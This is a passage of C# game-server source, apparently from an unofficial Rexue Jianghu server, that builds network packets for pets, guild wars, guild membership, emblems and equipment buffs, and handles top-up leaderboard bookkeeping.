			发送当前范围广播数据(发包类, 30464, base.人物灵兽全服ID);
		}

		public void 更新装备效果灵兽(Players thisPlayer)
		{
			byte[] array = Converter.hexStringToByte("AA5567000000640058000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽全服ID), 0, array, 14, 2);
			byte[] bytes = Encoding.Default.GetBytes(thisPlayer.人物灵兽.Name);
			Buffer.BlockCopy(bytes, 0, array, 18, bytes.Length);
			Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.FLD_LEVEL), 0, array, 38, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.FLD_JOB_LEVEL), 0, array, 39, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.FLD_JOB), 0, array, 40, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.Bs), 0, array, 42, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.人物坐标_X), 0, array, 46, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.人物坐标_Z), 0, array, 50, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.人物坐标_Y), 0, array, 54, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.人物坐标_MAP), 0, array, 58, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.人物坐标_X), 0, array, 82, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽.人物坐标_Y), 0, array, 90, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(thisPlayer.人物灵兽全服ID), 0, array, 4, 2);
			for (int i = 0; i < 4; i++)
			{
				byte[] src;
				try
				{
					src = 人物灵兽.宠物以装备[i].物品ID;
				}
				catch
				{
					src = new byte[4];
				}
				Buffer.BlockCopy(src, 0, array, 62 + i * 4, 4);
			}
			thisPlayer.发送当前范围广播数据多包(array, array.Length);
		}

		public void 充值入排行榜()
		{
			try
			{
				CheckTreasureGems();
				if (base.元宝充值 > 0)
				{
					int num = base.元宝充值 / int.Parse(World.充值排行比例[0]);
					int 累计充值 = base.累计充值;
					int num2 = 0;
					int num3 = num - num2;
					int 累计充值2 = 累计充值 + num - num2;
					if (累计充值 >= 0)
					{
						base.累计充值 = 累计充值2;
						检察元宝数据(num3 * int.Parse(World.充值排行比例[0]), 1, "充值");
						base.元宝充值 = num2;
					}
				}
				if (base.钻石充值 > 0)
				{
					int num4 = base.钻石充值 / int.Parse(World.充值排行比例[1]);
					int 累计充值3 = base.累计充值;
					int num5 = 0;
					int num6 = num4 - num5;
					int 累计充值4 = 累计充值3 + num4 - num5;
					if (累计充值3 >= 0)
					{
						base.累计充值 = 累计充值4;
						CheckGemPointsData(num6 * int.Parse(World.充值排行比例[1]), 1, "充值");
						base.钻石充值 = num5;
					}
				}
				SaveGemData();
				SavePlayerData();
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "百宝阁充值排行榜 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 取消帮战(byte[] 封包数据, int 封包大小)
		{
			int num = BitConverter.ToInt32(封包数据, 10);
			if (World.帮战list.TryGetValue(num, out var value))
			{
				value.申请人物列表.Clear();
				World.帮战list.TryRemove(num, out var _);
				CheckTreasureGems();
				检察元宝数据(50, 1, "帮战");
				RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "取消帮战返还", 1, 50);
				base.Player_Money += 50000000L;
				RxjhClass.帮战赌注删除(base.Userid, base.UserName, num, 0);
				SaveGemData();
				更新金钱和负重();
				MainForm.WriteLine(88, "取消帮战成功 申请帮派ID:" + num + " 帮派名字:" + base.帮派名字 + " 帮主:" + base.UserName);
				申请取消帮战提示(1);
			}
			else
			{
				申请取消帮战提示(0);
			}
		}

		public bool 当天是否已参战(string Name)
		{
			try
			{
				if (World.帮战Namelist == null || World.帮战Namelist.Count <= 0)
				{
					return false;
				}
				foreach (帮战Class value in World.帮战Namelist.Values)
				{
					using (new Lock(value.申请人物列表, "帮战申请人物列表"))
					{
						foreach (Players value2 in value.申请人物列表.Values)
						{
							if (value2.UserName == Name)
							{
								return true;
							}
						}
					}
				}
			}
			catch
			{
				return false;
			}
			return false;
		}

		public void 申请帮战(byte[] data, int length)
		{
			try
			{
				if (World.是否开启门战系统 == 0)
				{
					系统提示("帮战系统已关闭, 开放时间为每天" + World.门战系统开启时 + "时" + World.门战系统开启分 + "分" + World.门战系统开启秒 + "秒。");
					return;
				}
				if (World.新门战进程 >= 2)
				{
					系统提示("帮派混战正在进行中, 请下次申请。");
					return;
				}
				if (base.帮派名字.Length == 0)
				{
					系统提示("还没有加入任何门派, 不能申请帮战。");
					申请帮战提示(5);
					return;
				}
				if (World.帮战list.Count >= 4)
				{
					系统提示("申请帮战的帮派数已达到4个上限, 请下次申请。");
					申请帮战提示(5);
					return;
				}
				BitConverter.ToInt16(data, 14);
				int num = BitConverter.ToInt32(data, 2118);
				int num2 = BitConverter.ToInt32(data, 10);
				if (num != 7301)
				{
					系统提示("目前只开放地图[斗神馆]。");
					申请帮战提示(5);
					return;
				}
				if (World.帮战list.ContainsKey(num2))
				{
					系统提示("帮派已经申请, 无需重复申请。");
					return;
				}
				if (World.胜利帮派ID == base.帮派Id)
				{
					系统提示("本帮派在上次帮战中获得胜利, 今日不能再申请。");
					return;
				}
				ConcurrentDictionary<int, Players> concurrentDictionary = new ConcurrentDictionary<int, Players>();
				foreach (Players value in World.AllConnectedPlayers.Values)
				{
					if (value.人物坐标_地图 == 1201 && value.帮派名字 == base.帮派名字 && value.人物_HP > 0 && !value.Player死亡 && !value.退出中)
					{
						if (!当天是否已参战(value.UserName))
						{
							concurrentDictionary.TryAdd(value.人物全服ID, value);
						}
						else
						{
							value.系统提示("您在上次的帮战中获得胜利, 今日不能再参加帮战。");
						}
					}
				}
				if (concurrentDictionary.Count < 1)
				{
					申请帮战提示(4);
					concurrentDictionary.Clear();
					return;
				}
				CheckTreasureGems();
				if (base.FLD_RXPIONT >= World.申请门战需要元宝)
				{
					帮战Class 帮战Class2 = new 帮战Class
					{
						申请帮派ID = num2,
						申请地图 = num,
						申请帮派名称 = base.帮派名字,
						帮派门主 = base.UserName,
						等级 = base.帮派等级,
						申请人物列表 = concurrentDictionary,
						门主死亡次数 = 0,
						当前分数 = 0
					};
					World.帮战list.TryAdd(num2, 帮战Class2);
					World.帮战Namelist.TryAdd(base.帮派Id, 帮战Class2);
					申请帮战提示(0);
					MainForm.WriteLine(88, "申请帮战成功 申请帮派ID:" + num2 + " 帮派名字:" + base.帮派名字 + " 帮主:" + base.UserName + " 人数:" + 帮战Class2.申请人物列表.Count);
					检察元宝数据(World.申请门战需要元宝, 0, "帮战");
					RxjhClass.帮战赌注(base.Userid, base.UserName, num2, World.申请门战需要元宝);
					foreach (Players value2 in 帮战Class2.申请人物列表.Values)
					{
						value2.安全模式 = 1;
					}
					SaveGemData();
				}
				else
				{
					系统提示("元宝不够了，申请帮战需要支付" + World.申请门战需要元宝 + "元宝。");
					申请帮战提示(2);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "申请帮战 出错：" + ex);
			}
		}

		public void 申请帮战提示(int id)
		{
			byte[] array = Converter.hexStringToByte("AA5512003F003D10040004000000000000000000BE9A55AA");
			Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 10, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 申请取消帮战提示(int id)
		{
			byte[] array = Converter.hexStringToByte("AA5512003F003B10040001000000000000000000BE9A55AA");
			Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 10, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 帮战配对成功公告提示(int id)
		{
			byte[] array = Converter.hexStringToByte("AA55AA000F2766009C000830000000000000000000000000000000000000000002307C000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000690000640A000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 帮战准备公告提示(string sj)
		{
			byte[] array = Converter.hexStringToByte("AA55AA000F3766009C000830000000000000000000000000000000000000000003317C330000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000690000650A000000000000000055AA");
			Buffer.BlockCopy(Encoding.Default.GetBytes(sj), 0, array, 35, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 帮战开始提示(int 开关, int id2)
		{
			byte[] array = Converter.hexStringToByte("AA5510000000161002000100000000000000000055AA");
			if (开关 == 1)
			{
				base.人物PK模式 = 2;
				array[11] = 2;
				系统倒计时(1, 1800);
			}
			else
			{
				base.人物PK模式 = 0;
				array[11] = 0;
				系统倒计时(0, 0);
			}
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			byte[] array2 = Converter.hexStringToByte("AA5542003B022C0134000100010013195D00821B5D0000000000000000000000000000000000000000000000000000000000000000000E020000DB0100000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(开关), 0, array2, 10, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(id2), 0, array2, 14, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array2, array2.Length);
			}
		}

		public void 检测神器斗战增加状态()
		{
			try
			{
				if (BitConverter.ToInt32(装备栏已穿装备[3].物品ID, 0) != 0)
				{
					ItmeClass itmeClass = World.Itme[BitConverter.ToInt32(装备栏已穿装备[3].物品ID, 0)];
					string itmeDES = itmeClass.ItmeDES;
					if (itmeDES.Contains("160级") && itmeClass.FLD_RESIDE2 == 4)
					{
						if (GetAddState(900000203))
						{
							追加状态列表[900000203].时间结束事件();
						}
						if (GetAddState(900000204))
						{
							追加状态列表[900000204].时间结束事件();
						}
						if (GetAddState(900000205))
						{
							追加状态列表[900000205].时间结束事件();
						}
						if (GetAddState(900000206))
						{
							追加状态列表[900000206].时间结束事件();
						}
						追加状态类 追加状态类2 = new 追加状态类(this, 864000000, 900000203, 1);
						追加状态列表.MergeSafe(追加状态类2.FLD_PID, 追加状态类2);
						状态效果(BitConverter.GetBytes(900000203), 1, 864000000);
						更新HP_MP_SP();
						更新武功和状态();
						计算人物装备数据();
					}
					else if (itmeDES.Contains("170级") && itmeClass.FLD_RESIDE2 == 4)
					{
						if (GetAddState(900000203))
						{
							追加状态列表[900000203].时间结束事件();
						}
						if (GetAddState(900000204))
						{
							追加状态列表[900000204].时间结束事件();
						}
						if (GetAddState(900000205))
						{
							追加状态列表[900000205].时间结束事件();
						}
						if (GetAddState(900000206))
						{
							追加状态列表[900000206].时间结束事件();
						}
						追加状态类 追加状态类3 = new 追加状态类(this, 864000000, 900000204, 1);
						追加状态列表.MergeSafe(追加状态类3.FLD_PID, 追加状态类3);
						状态效果(BitConverter.GetBytes(900000204), 1, 864000000);
						更新HP_MP_SP();
						更新武功和状态();
						计算人物装备数据();
					}
					else if (itmeDES.Contains("180级") && itmeClass.FLD_RESIDE2 == 4)
					{
						if (GetAddState(900000203))
						{
							追加状态列表[900000203].时间结束事件();
						}
						if (GetAddState(900000204))
						{
							追加状态列表[900000204].时间结束事件();
						}
						if (GetAddState(900000205))
						{
							追加状态列表[900000205].时间结束事件();
						}
						if (GetAddState(900000206))
						{
							追加状态列表[900000206].时间结束事件();
						}
						追加状态类 追加状态类4 = new 追加状态类(this, 864000000, 900000205, 1);
						追加状态列表.MergeSafe(追加状态类4.FLD_PID, 追加状态类4);
						状态效果(BitConverter.GetBytes(900000205), 1, 864000000);
						更新HP_MP_SP();
						更新武功和状态();
						计算人物装备数据();
						更新广播人物数据();
						更新人物数据(this);
						更新装备效果();
					}
					else if (itmeDES.Contains("190级") && itmeClass.FLD_RESIDE2 == 4)
					{
						if (GetAddState(900000203))
						{
							追加状态列表[900000203].时间结束事件();
						}
						if (GetAddState(900000204))
						{
							追加状态列表[900000204].时间结束事件();
						}
						if (GetAddState(900000205))
						{
							追加状态列表[900000205].时间结束事件();
						}
						if (GetAddState(900000206))
						{
							追加状态列表[900000206].时间结束事件();
						}
						追加状态类 追加状态类5 = new 追加状态类(this, 864000000, 900000206, 1);
						追加状态列表.MergeSafe(追加状态类5.FLD_PID, 追加状态类5);
						状态效果(BitConverter.GetBytes(900000206), 1, 864000000);
						更新HP_MP_SP();
						更新武功和状态();
						计算人物装备数据();
						更新广播人物数据();
						更新人物数据(this);
						更新装备效果();
					}
					else if (追加状态列表 != null)
					{
						if (GetAddState(900000203) && itmeClass.FLD_RESIDE2 == 4)
						{
							追加状态列表[900000203].时间结束事件();
						}
						if (GetAddState(900000204) && itmeClass.FLD_RESIDE2 == 4)
						{
							追加状态列表[900000204].时间结束事件();
						}
						if (GetAddState(900000205) && itmeClass.FLD_RESIDE2 == 4)
						{
							追加状态列表[900000205].时间结束事件();
						}
						if (GetAddState(900000206) && itmeClass.FLD_RESIDE2 == 4)
						{
							追加状态列表[900000206].时间结束事件();
						}
					}
				}
				if (BitConverter.ToInt32(装备栏已穿装备[11].物品ID, 0) != 0)
				{
					ItmeClass itmeClass2 = World.Itme[BitConverter.ToInt32(装备栏已穿装备[11].物品ID, 0)];
					string itmeDES2 = itmeClass2.ItmeDES;
					if (itmeDES2.Contains("斗战披风") && itmeClass2.FLD_RESIDE2 == 12)
					{
						if (GetAddState(1008001134))
						{
							追加状态列表[1008001134].时间结束事件();
						}
						if (GetAddState(1008001135))
						{
							追加状态列表[1008001135].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(1008001135), 1, 604800000);
						追加状态类 追加状态类6 = new 追加状态类(this, 604800000, 1008001135, 1);
						追加状态列表.Add(追加状态类6.FLD_PID, 追加状态类6);
					}
					else if (追加状态列表 != null && GetAddState(1008001135) && itmeClass2.FLD_RESIDE2 == 12)
					{
						追加状态列表[1008001135].时间结束事件();
					}
					计算人物装备数据();
					更新气功();
					更新HP_MP_SP();
					更新武功和状态();
				}
				if (BitConverter.ToInt32(装备栏已穿装备[12].物品ID, 0) == 0)
				{
					return;
				}
				ItmeClass itmeClass3 = World.Itme[BitConverter.ToInt32(装备栏已穿装备[12].物品ID, 0)];
				string itmeDES3 = itmeClass3.ItmeDES;
				if (itmeDES3.Contains("至尊无双") && itmeClass3.FLD_RESIDE2 == 13)
				{
					if (GetAddState(1008001159 + 追加项链属性))
					{
						追加状态列表[1008001159 + 追加项链属性].时间结束事件();
					}
					if (itmeClass3.FLD_PID == 1900004)
					{
						追加项链属性 = 1;
					}
					else if (itmeClass3.FLD_PID == 1900003)
					{
						追加项链属性 = 2;
					}
					else if (itmeClass3.FLD_PID == 1900002)
					{
						追加项链属性 = 3;
					}
					else if (itmeClass3.FLD_PID == 1900001)
					{
						追加项链属性 = 4;
					}
					状态效果(BitConverter.GetBytes(1008001159 + 追加项链属性), 1, 864000000);
					追加状态类 追加状态类7 = new 追加状态类(this, 864000000, 1008001159 + 追加项链属性, 1);
					追加状态列表.Add(追加状态类7.FLD_PID, 追加状态类7);
					addFLD_装备_追加_武器_强化(追加项链属性);
					addFLD_装备_追加_防具_强化(追加项链属性);
					计算人物装备数据();
					更新武功和状态();
				}
				else if (追加状态列表 != null && GetAddState(1008001159 + 追加项链属性) && itmeClass3.FLD_RESIDE2 == 13)
				{
					追加状态列表[1008001159 + 追加项链属性].时间结束事件();
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "检测神器斗战增加状态 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 检测装备强化数()
		{
			try
			{
				if (装备栏已穿装备[0].FLD_强化数量 >= 15 && 装备栏已穿装备[1].FLD_强化数量 >= 15 && 装备栏已穿装备[2].FLD_强化数量 >= 15 && 装备栏已穿装备[3].FLD_强化数量 >= 15 && 装备栏已穿装备[4].FLD_强化数量 >= 15 && 装备栏已穿装备[5].FLD_强化数量 >= 15)
				{
					int fLD_强化数量 = 装备栏已穿装备[0].FLD_强化数量;
					int fLD_强化数量2 = 装备栏已穿装备[1].FLD_强化数量;
					int fLD_强化数量3 = 装备栏已穿装备[2].FLD_强化数量;
					int fLD_强化数量4 = 装备栏已穿装备[3].FLD_强化数量;
					int fLD_强化数量5 = 装备栏已穿装备[4].FLD_强化数量;
					int fLD_强化数量6 = 装备栏已穿装备[5].FLD_强化数量;
					if (fLD_强化数量 == 15 || fLD_强化数量2 == 15 || fLD_强化数量3 == 15 || fLD_强化数量4 == 15 || fLD_强化数量5 == 15 || fLD_强化数量6 == 15)
					{
						if (GetAddState(1000000675))
						{
							追加状态列表[1000000675].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(1000000675), 1, 864000000);
						追加状态类 追加状态类2 = new 追加状态类(this, 864000000, 1000000675, 1);
						追加状态列表.Add(追加状态类2.FLD_PID, 追加状态类2);
						base.人物追加最大_HP += 3000;
						base.FLD_人物_追加_攻击 += 500;
						base.FLD_人物_追加_防御 += 500;
					}
					更新HP_MP_SP();
					更新武功和状态();
				}
				else if (GetAddState(1000000675))
				{
					追加状态列表[1000000675].时间结束事件();
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "检测装备强化数增加状态 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 神器斗战披风结束(int num)
		{
			try
			{
				ItmeClass itmeClass = World.Itme[num];
				string itmeDES = itmeClass.ItmeDES;
				if (追加状态列表 == null)
				{
					return;
				}
				if (GetAddState(900000203) && itmeDES.Contains("160级") && itmeClass.FLD_RESIDE2 == 4)
				{
					追加状态列表[900000203].时间结束事件();
				}
				else if (GetAddState(900000204) && itmeDES.Contains("170级") && itmeClass.FLD_RESIDE2 == 4)
				{
					追加状态列表[900000204].时间结束事件();
				}
				else if (GetAddState(900000205) && itmeDES.Contains("180级") && itmeClass.FLD_RESIDE2 == 4)
				{
					追加状态列表[900000205].时间结束事件();
				}
				else if (GetAddState(900000206) && itmeDES.Contains("190级") && itmeClass.FLD_RESIDE2 == 4)
				{
					追加状态列表[900000206].时间结束事件();
				}
				else if (GetAddState(1008001135) && itmeDES.Contains("斗战披风") && itmeClass.FLD_RESIDE2 == 12)
				{
					追加状态列表[1008001135].时间结束事件();
				}
				else if (GetAddState(1008001159 + 追加项链属性) && itmeDES.Contains("至尊无双") && itmeClass.FLD_RESIDE2 == 13)
				{
					追加状态列表[1008001159 + 追加项链属性].时间结束事件();
				}
				if (itmeClass.FLD_RESIDE2 == 1 || itmeClass.FLD_RESIDE2 == 2 || itmeClass.FLD_RESIDE2 == 4 || itmeClass.FLD_RESIDE2 == 5 || itmeClass.FLD_RESIDE2 == 6)
				{
					if (GetAddState(1000000672))
					{
						追加状态列表[1000000672].时间结束事件();
					}
					if (GetAddState(1000000673))
					{
						追加状态列表[1000000673].时间结束事件();
					}
					if (GetAddState(1000000674))
					{
						追加状态列表[1000000674].时间结束事件();
					}
					if (GetAddState(1000000675))
					{
						追加状态列表[1000000675].时间结束事件();
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "检测神器斗战披风结束出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 系统倒计时(int id, int id2)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA552E000F2713222000090001000B000000010000000C0000002101000000000000000000000000000000000000000002EE55AA");
				Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 12, 1);
				Buffer.BlockCopy(BitConverter.GetBytes(id2), 0, array, 26, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch
			{
			}
		}

		public void 帮战更新分数(int zfs, int kfs)
		{
			byte[] array = Converter.hexStringToByte("AA5516000F2739100800FFFFFFFF000000000000000000003C5B55AA");
			Buffer.BlockCopy(BitConverter.GetBytes(zfs), 0, array, 10, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(kfs), 0, array, 14, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 变更门服(byte[] 封包数据, int 封包大小)
		{
			PacketReader packetReader = new PacketReader(封包数据, 封包大小, fixedSize: false);
			packetReader.Seek(10, SeekOrigin.Begin);
			int 帮派id = packetReader.ReadInt32();
			packetReader.ReadInt16();
			base.帮派门服字 = packetReader.ReadInt16();
			base.帮派门服颜色 = packetReader.ReadInt16();
			byte[] array = Converter.hexStringToByte("AA551E0045049100100002000000020000003D000000000000000000000000003C9455AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			byte[] array2 = Converter.hexStringToByte("AA551E00450442151000B8530000010001001C800000002D3101000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.帮派Id), 0, array2, 10, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.帮派门服字), 0, array2, 16, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.帮派门服颜色), 0, array2, 18, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			if (base.Client != null)
			{
				base.Client.Send(array2, array2.Length);
			}
			发送当前范围广播数据(array2, array2.Length);
			打开仓库中 = false;
			int 帮派门服字 = base.帮派门服字;
			int 帮派门服颜色 = base.帮派门服颜色;
			RxjhClass.变更门服(帮派id, 帮派门服字, 帮派门服颜色);
		}

		public void 申请门徽(byte[] 封包数据, int 封包大小)
		{
			byte[] array = new byte[770];
			Buffer.BlockCopy(封包数据, 18, array, 0, 770);
			RxjhClass.申请门徽(base.帮派Id, array);
			发送门徽2(array, base.帮派Id);
		}

		public void 得到门徽(byte[] 封包数据, int 封包大小)
		{
			PacketReader packetReader = new PacketReader(封包数据, 封包大小, fixedSize: false);
			packetReader.Seek(10, SeekOrigin.Begin);
			int id = packetReader.ReadInt32();
			byte[] array = RxjhClass.得到门徽(id);
			if (array != null)
			{
				发送门徽2(array, id);
			}
		}

		public void 赋予职位(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = new byte[4];
				Buffer.BlockCopy(封包数据, 10, array, 0, 2);
				int num = BitConverter.ToInt32(array, 0);
				byte[] array2 = Converter.hexStringToByte("AA551E000A00EF00100001000000000000000000000000000000000000000000000055AA");
				byte[] array3 = new byte[14];
				Buffer.BlockCopy(封包数据, 12, array3, 0, 14);
				Players players = 得到人物数据(Encoding.Default.GetString(array3).Replace("\0", string.Empty));
				if (players != null)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array2, 10, 1);
					if (num == 6)
					{
						base.帮派人物等级 = 5;
						RxjhClass.赋予帮主职位(players.UserName, base.UserName, base.帮派名字);
					}
					RxjhClass.帮派赋予职位(num, players.UserName);
					players.帮派人物等级 = num;
					players.查帮派();
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(4), 0, array2, 10, 1);
				}
				if (base.Client != null)
				{
					base.Client.Send(array2, array2.Length);
				}
			}
			catch
			{
			}
		}

		public void 加入门派(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = new byte[4];
				Buffer.BlockCopy(封包数据, 27, array, 0, 1);
				switch (BitConverter.ToInt32(array, 0))
				{
				case 1:
				{
					byte[] array7 = new byte[4];
					Buffer.BlockCopy(封包数据, 10, array7, 0, 2);
					Players players2 = 得到人物数据(BitConverter.ToInt32(array7, 0));
					if (players2 == null)
					{
						break;
					}
					if (World.是否开启同势力门派 == 1 && players2.Player_Zx != base.Player_Zx)
					{
						系统提示("对方与你是敌对势力，无法加入同一门派");
						break;
					}
					byte[] array8 = Converter.hexStringToByte("AA5530002A03E80022003103400000000000000000000000000000010AC0B600000000000000000000000000000000000000000055AA");
					byte[] bytes3 = Encoding.Default.GetBytes(base.帮派名字);
					Buffer.BlockCopy(bytes3, 0, array8, 12, bytes3.Length);
					byte[] bytes4 = Encoding.Default.GetBytes(players2.UserName);
					Buffer.BlockCopy(bytes4, 0, array8, 29, bytes4.Length);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array8, 4, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(players2.人物全服ID), 0, array8, 10, 2);
					DataTable dataTable2 = RxjhClass.得到帮派人数(base.帮派名字);
					if (dataTable2.Rows.Count >= 200)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(18), 0, array8, 28, 1);
					}
					else if (players2.个人商店 != null)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(16), 0, array8, 28, 1);
					}
					else if (players2.Player_Level >= 35 && players2.Player_Job_leve >= 2)
					{
						if (players2.帮派Id != 0)
						{
							Buffer.BlockCopy(BitConverter.GetBytes(17), 0, array8, 28, 1);
						}
						else if (players2.Client != null)
						{
							players2.Client.Send(array8, array8.Length);
						}
					}
					else if (base.Player_Zx == players2.Player_Zx)
					{
						if (players2.帮派Id != 0)
						{
							Buffer.BlockCopy(BitConverter.GetBytes(17), 0, array8, 28, 1);
						}
						else if (players2.Client != null)
						{
							players2.Client.Send(array8, array8.Length);
						}
					}
					else
					{
						Buffer.BlockCopy(BitConverter.GetBytes(16), 0, array8, 28, 1);
					}
					dataTable2.Dispose();
					if (base.Client != null)
					{
						base.Client.Send(array8, array8.Length);
					}
					break;
				}
				case 2:
				{
					byte[] array9 = new byte[4];
					Buffer.BlockCopy(封包数据, 10, array9, 0, 2);
					int 人物ID = BitConverter.ToInt32(array9, 0);
					byte[] array10 = new byte[4];
					Buffer.BlockCopy(封包数据, 28, array10, 0, 1);
					switch (BitConverter.ToInt32(array10, 0))
					{
					case 21:
					{
						byte[] array2 = Converter.hexStringToByte("AA5530002A03E80022002A034400000000000000000000000000000215C0B600000000000000000000000000000000000000000055AA");
						byte[] bytes6 = Encoding.Default.GetBytes(base.UserName);
						Buffer.BlockCopy(bytes6, 0, array2, 29, bytes6.Length);
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
						Players players4 = 得到人物数据(人物ID);
						if (players4 != null)
						{
							byte[] bytes7 = Encoding.Default.GetBytes(players4.帮派名字);
							Buffer.BlockCopy(bytes7, 0, array2, 12, bytes7.Length);
							Buffer.BlockCopy(BitConverter.GetBytes(players4.人物全服ID), 0, array2, 10, 2);
							if (players4.Client != null)
							{
								players4.Client.Send(array2, array2.Length);
							}
							RxjhClass.加入帮派(base.UserName, players4.帮派名字, base.Player_Level);
						}
						if (base.Client != null)
						{
							base.Client.Send(array2, array2.Length);
						}
						读帮派数据();
						初始化已装备物品();
						移动离开当前地图(base.人物坐标_地图);
						获取复查范围玩家();
						break;
					}
					case 22:
					{
						byte[] array3 = Converter.hexStringToByte("AA5530000A00E80022000B00CC00000000000000000000000000000216617300000000000000000000000000000000000000000055AA");
						byte[] bytes8 = Encoding.Default.GetBytes(base.UserName);
						Buffer.BlockCopy(bytes8, 0, array3, 29, bytes8.Length);
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
						Players players5 = 得到人物数据(人物ID);
						if (players5 != null)
						{
							byte[] bytes9 = Encoding.Default.GetBytes(players5.帮派名字);
							Buffer.BlockCopy(bytes9, 0, array3, 12, bytes9.Length);
							Buffer.BlockCopy(BitConverter.GetBytes(players5.人物全服ID), 0, array3, 10, 2);
							if (players5.Client != null)
							{
								players5.Client.Send(array3, array3.Length);
							}
						}
						if (base.Client != null)
						{
							base.Client.Send(array3, array3.Length);
						}
						break;
					}
					case 23:
					{
						byte[] array11 = Converter.hexStringToByte("AA5530000A00E80022000B000000000000000000000000000000000217BDD600000000000000000000000000000000000000000055AA");
						byte[] bytes5 = Encoding.Default.GetBytes(base.UserName);
						Buffer.BlockCopy(bytes5, 0, array11, 29, bytes5.Length);
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array11, 4, 2);
						Players players3 = 得到人物数据(人物ID);
						if (players3 != null)
						{
							Buffer.BlockCopy(BitConverter.GetBytes(players3.人物全服ID), 0, array11, 10, 2);
							if (players3.Client != null)
							{
								players3.Client.Send(array11, array11.Length);
							}
						}
						if (base.Client != null)
						{
							base.Client.Send(array11, array11.Length);
						}
						break;
					}
					}
					break;
				}
				case 3:
				{
					if (base.人物坐标_地图 == 42001)
					{
						系统提示("当前地图不能退出门派");
						break;
					}
					byte[] array6 = Converter.hexStringToByte("AA5530000B00E80022000000000000000000000000000000000000031F000000000000000000000000000000000000000000000055AA");
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array6, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array6, array6.Length);
					}
					byte[] bytes2 = Encoding.Default.GetBytes(base.UserName);
					Buffer.BlockCopy(bytes2, 0, array6, 29, bytes2.Length);
